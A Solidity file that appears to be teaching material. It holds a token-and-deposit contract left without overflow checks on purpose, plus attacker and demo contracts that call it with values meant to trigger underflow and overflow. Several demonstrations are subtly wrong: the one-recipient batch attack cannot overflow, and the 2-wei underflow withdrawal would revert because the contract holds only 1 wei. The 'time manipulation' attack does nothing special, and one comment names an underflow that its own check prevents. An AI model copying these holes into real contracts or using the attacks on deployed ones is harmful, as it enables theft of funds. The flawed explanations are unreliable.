// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // Using older version to demonstrate overflow vulnerabilities

/**
 * @title IntegerOverflowVulnerable
 * @dev Demonstrates integer overflow and underflow vulnerabilities
 * 
 * WARNING: This contract is intentionally vulnerable and should NEVER be used in production!
 * 
 * Vulnerabilities demonstrated:
 * 1. Integer overflow in addition operations
 * 2. Integer underflow in subtraction operations
 * 3. Multiplication overflow
 * 4. Unsafe token transfer calculations
 * 5. Time manipulation through overflow
 */
contract IntegerOverflowVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lastWithdrawal;
    
    uint256 public totalSupply;
    uint256 public constant WITHDRAWAL_DELAY = 1 days;
    uint256 public constant MAX_WITHDRAWAL = 1000 ether;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    
    /**
     * @dev Vulnerable deposit function - can overflow totalSupply
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        
        // VULNERABILITY: No overflow check
        balances[msg.sender] += msg.value;
        totalSupply += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev Vulnerable withdrawal function - can underflow balance
     */
    function withdraw(uint256 amount) external {
        require(amount > 0, "Must withdraw something");
        
        // VULNERABILITY: No underflow check
        balances[msg.sender] -= amount;
        totalSupply -= amount;
        
        // VULNERABILITY: Time manipulation through overflow
        require(block.timestamp >= lastWithdrawal[msg.sender] + WITHDRAWAL_DELAY, "Too soon");
        
        lastWithdrawal[msg.sender] = block.timestamp;
        
        payable(msg.sender).transfer(amount);
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev Vulnerable transfer function
     */
    function transfer(address to, uint256 amount) external {
        require(to != address(0), "Invalid recipient");
        require(amount > 0, "Must transfer something");
        
        // VULNERABILITY: No underflow check for sender
        balances[msg.sender] -= amount;
        
        // VULNERABILITY: No overflow check for recipient
        balances[to] += amount;
        
        emit Transfer(msg.sender, to, amount);
    }
    
    /**
     * @dev Vulnerable batch transfer - multiplication overflow
     */
    function batchTransfer(address[] calldata recipients, uint256 amount) external {
        require(recipients.length > 0, "No recipients");
        require(amount > 0, "Must transfer something");
        
        // VULNERABILITY: Multiplication overflow
        uint256 totalAmount = recipients.length * amount;
        
        // VULNERABILITY: No underflow check
        balances[msg.sender] -= totalAmount;
        
        for (uint256 i = 0; i < recipients.length; i++) {
            // VULNERABILITY: No overflow check for each recipient
            balances[recipients[i]] += amount;
            emit Transfer(msg.sender, recipients[i], amount);
        }
    }
    
    /**
     * @dev Vulnerable reward calculation
     */
    function calculateReward(uint256 principal, uint256 rate, uint256 time) 
        external 
        pure 
        returns (uint256) 
    {
        // VULNERABILITY: Multiplication overflow in reward calculation
        // Formula: reward = principal * rate * time / 10000
        return (principal * rate * time) / 10000;
    }
    
    /**
     * @dev Vulnerable time-based bonus
     */
    function getTimeBonus(uint256 depositTime) external view returns (uint256) {
        require(depositTime <= block.timestamp, "Invalid deposit time");
        
        // VULNERABILITY: Subtraction underflow if depositTime > block.timestamp
        uint256 timeDiff = block.timestamp - depositTime;
        
        // VULNERABILITY: Multiplication overflow
        return timeDiff * 100; // 100 wei per second bonus
    }
    
    /**
     * @dev Vulnerable fee calculation
     */
    function calculateFee(uint256 amount, uint256 feeRate) external pure returns (uint256) {
        // VULNERABILITY: Multiplication overflow
        return (amount * feeRate) / 100;
    }
    
    /**
     * @dev Vulnerable compound interest calculation
     */
    function compoundInterest(
        uint256 principal, 
        uint256 rate, 
        uint256 periods
    ) external pure returns (uint256) {
        uint256 result = principal;
        
        for (uint256 i = 0; i < periods; i++) {
            // VULNERABILITY: Multiplication overflow in compound calculation
            result = (result * (100 + rate)) / 100;
        }
        
        return result;
    }
    
    /**
     * @dev Vulnerable array sum calculation
     */
    function sumArray(uint256[] calldata numbers) external pure returns (uint256) {
        uint256 sum = 0;
        
        for (uint256 i = 0; i < numbers.length; i++) {
            // VULNERABILITY: Addition overflow
            sum += numbers[i];
        }
        
        return sum;
    }
    
    /**
     * @dev Vulnerable token sale with bonus
     */
    function buyTokensWithBonus(uint256 baseAmount, uint256 bonusPercent) 
        external 
        payable 
        returns (uint256) 
    {
        require(msg.value > 0, "Must send ETH");
        require(baseAmount > 0, "Invalid base amount");
        
        // VULNERABILITY: Multiplication overflow in bonus calculation
        uint256 bonus = (baseAmount * bonusPercent) / 100;
        
        // VULNERABILITY: Addition overflow
        uint256 totalTokens = baseAmount + bonus;
        
        // VULNERABILITY: No overflow check
        balances[msg.sender] += totalTokens;
        totalSupply += totalTokens;
        
        return totalTokens;
    }
    
    /**
     * @dev Vulnerable withdrawal with penalty
     */
    function withdrawWithPenalty(uint256 amount, uint256 penaltyPercent) external {
        require(amount > 0, "Must withdraw something");
        require(penaltyPercent <= 100, "Invalid penalty");
        
        // VULNERABILITY: Multiplication overflow
        uint256 penalty = (amount * penaltyPercent) / 100;
        
        // VULNERABILITY: Subtraction underflow if penalty > amount
        uint256 netAmount = amount - penalty;
        
        // VULNERABILITY: No underflow check
        balances[msg.sender] -= amount;
        totalSupply -= amount;
        
        payable(msg.sender).transfer(netAmount);
        emit Withdrawal(msg.sender, netAmount);
    }
    
    // Getter functions
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getTotalSupply() external view returns (uint256) {
        return totalSupply;
    }
}

/**
 * @title OverflowAttacker
 * @dev Contract to demonstrate overflow/underflow attacks
 */
contract OverflowAttacker {
    IntegerOverflowVulnerable public target;
    
    constructor(address _target) {
        target = IntegerOverflowVulnerable(_target);
    }
    
    /**
     * @dev Attack using integer underflow in withdrawal
     */
    function underflowAttack() external {
        // Deposit small amount
        target.deposit{value: 1 wei}();
        
        // Try to withdraw more than balance to cause underflow
        // This will underflow and give us a huge balance
        target.withdraw(2 wei);
    }
    
    /**
     * @dev Attack using batch transfer overflow
     */
    function batchTransferOverflowAttack() external {
        // Deposit some amount
        target.deposit{value: 1 ether}();
        
        // Create array with large number that will cause overflow
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        
        // Use amount that when multiplied by array length causes overflow
        // This will make totalAmount wrap around to a small number
        uint256 amount = type(uint256).max / 2 + 1;
        
        target.batchTransfer(recipients, amount);
    }
    
    /**
     * @dev Attack using time manipulation
     */
    function timeManipulationAttack() external {
        // This attack exploits potential overflow in time calculations
        // In practice, this would require manipulating block.timestamp
        
        target.deposit{value: 1 ether}();
        
        // If we could manipulate time to cause overflow in withdrawal delay check
        // we could bypass the time restriction
        target.withdraw(1 ether);
    }
    
    /**
     * @dev Attack using compound interest overflow
     */
    function compoundInterestOverflowAttack() external view returns (uint256) {
        // Use values that will cause overflow in compound interest calculation
        return target.compoundInterest(
            type(uint256).max / 2, // Large principal
            50, // 50% interest rate
            10  // 10 periods
        );
    }
    
    receive() external payable {}
}

/**
 * @title OverflowExploitDemo
 * @dev Demonstrates various overflow/underflow exploits
 */
contract OverflowExploitDemo {
    IntegerOverflowVulnerable public vulnerableContract;
    
    event ExploitResult(string exploitType, bool success, uint256 value);
    
    constructor() {
        vulnerableContract = new IntegerOverflowVulnerable();
    }
    
    /**
     * @dev Demonstrate balance underflow exploit
     */
    function demonstrateBalanceUnderflow() external payable {
        // Deposit 1 wei
        vulnerableContract.deposit{value: 1 wei}();
        
        uint256 balanceBefore = vulnerableContract.getBalance(address(this));
        
        // Try to withdraw more than balance
        try vulnerableContract.withdraw(2 wei) {
            uint256 balanceAfter = vulnerableContract.getBalance(address(this));
            emit ExploitResult("Balance Underflow", true, balanceAfter);
        } catch {
            emit ExploitResult("Balance Underflow", false, 0);
        }
    }
    
    /**
     * @dev Demonstrate multiplication overflow in rewards
     */
    function demonstrateRewardOverflow() external {
        try vulnerableContract.calculateReward(
            type(uint256).max / 2,
            type(uint256).max / 2,
            2
        ) returns (uint256 reward) {
            emit ExploitResult("Reward Overflow", true, reward);
        } catch {
            emit ExploitResult("Reward Overflow", false, 0);
        }
    }
    
    /**
     * @dev Demonstrate array sum overflow
     */
    function demonstrateArraySumOverflow() external {
        uint256[] memory largeNumbers = new uint256[](2);
        largeNumbers[0] = type(uint256).max / 2 + 1;
        largeNumbers[1] = type(uint256).max / 2 + 1;
        
        try vulnerableContract.sumArray(largeNumbers) returns (uint256 sum) {
            emit ExploitResult("Array Sum Overflow", true, sum);
        } catch {
            emit ExploitResult("Array Sum Overflow", false, 0);
        }
    }
    
    receive() external payable {}
}